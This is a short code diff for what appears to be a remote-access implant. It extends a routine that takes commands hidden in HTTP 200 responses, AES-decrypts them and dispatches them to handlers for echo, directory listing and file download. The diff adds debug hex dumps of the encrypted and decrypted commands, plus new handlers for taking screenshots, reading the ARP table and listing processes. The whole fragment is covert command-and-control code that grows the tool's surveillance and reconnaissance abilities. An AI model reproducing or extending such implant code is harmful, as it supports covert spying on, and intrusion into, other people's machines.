@@ -122,8 +122,15 @@ void Receive200OK() {
     analyze200OK(buf, &encryptCMD, &cmdLen);
     if(cmdLen == 0) return;
 
+    TOTAL_PRINTF("encryptCMD = \n");
+    hexDump((PBYTE)encryptCMD, cmdLen);
+
     memmove(cmd, encryptCMD, cmdLen);
     globalAES->DecryptData((PBYTE)cmd, &cmdLen);
+
+    TOTAL_PRINTF("Decrypted CMD = \n");
+    hexDump((PBYTE)cmd, cmdLen);
+    
     short cmdNum = *((short *)cmd);
     char *args = cmd + 2;
     int argsLen = cmdLen - 2;
@@ -136,6 +143,9 @@ void Receive200OK() {
         case 2: message = commandEcho(args, argsLen, &msgLen); break;
         case 3: message = command_ls(args, argsLen, &msgLen); break;
         case 4: message = command_download(args, argsLen, &msgLen); break;
+        case 5: message = command_screenshot(args, argsLen, &msgLen); break;
+        case 6: message = command_arp(args, argsLen, &msgLen); break;
+        case 7: message = command_process(args, argsLen, &msgLen); break;
         default: message = nullptr;
     }
     if(message != nullptr) {
